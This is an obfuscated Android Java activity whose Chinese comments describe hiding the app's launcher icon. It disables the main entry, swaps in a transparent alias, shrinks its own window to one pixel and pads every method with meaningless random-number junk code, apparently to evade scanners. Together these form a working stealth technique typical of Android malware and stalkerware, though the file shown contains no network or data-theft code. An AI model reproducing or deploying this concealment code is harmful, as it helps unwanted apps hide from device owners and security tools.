package lgvh.pehld.vsrdn;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（PFOO），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class ZNKC extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        int process_qfbZQ = new java.util.Random().nextInt(50);
        int stack_MFVmr = (process_qfbZQ > 33) ? 1 : ((process_qfbZQ > 48) ? 47 : ((process_qfbZQ > 97) ? 29 : 39));
        int i_mvGIWOwQIwHF = stack_MFVmr * process_qfbZQ;
        if (i_mvGIWOwQIwHF > 37) {
            java.lang.System.arraycopy(new int[] { i_mvGIWOwQIwHF }, 0, new int[] { 0 }, 0, 1);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(ZNKC.this, PFOO.class.getName(), "lgvh.pehld.vsrdn.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(ZNKC.this, "lgvh.pehld.vsrdn.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_qfbZQ = new java.util.Random().nextInt(50);
        int stack_MFVmr = (process_qfbZQ > 33) ? 1 : ((process_qfbZQ > 48) ? 47 : ((process_qfbZQ > 97) ? 29 : 39));
        int i_mvGIWOwQIwHF = stack_MFVmr * process_qfbZQ;
        if (i_mvGIWOwQIwHF > 37) {
            java.lang.System.arraycopy(new int[] { i_mvGIWOwQIwHF }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        int process_qfbZQ = new java.util.Random().nextInt(50);
        int stack_MFVmr = (process_qfbZQ > 33) ? 1 : ((process_qfbZQ > 48) ? 47 : ((process_qfbZQ > 97) ? 29 : 39));
        int i_mvGIWOwQIwHF = stack_MFVmr * process_qfbZQ;
        if (i_mvGIWOwQIwHF > 37) {
            java.lang.System.arraycopy(new int[] { i_mvGIWOwQIwHF }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        long arr_xQgQlupJnhybSKbekN = java.lang.System.nanoTime();
        int i_IOCVi = new java.util.Random().nextInt(1000);
        boolean j_THAFlWPnjnKzi = (arr_xQgQlupJnhybSKbekN % (i_IOCVi + 83)) > 51;
        double tmp_vYnEU = j_THAFlWPnjnKzi ? java.lang.Math.sqrt(i_IOCVi) : java.lang.Math.pow(i_IOCVi, 72);
        if (tmp_vYnEU < 0.0) {
            java.lang.System.out.println(tmp_vYnEU);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
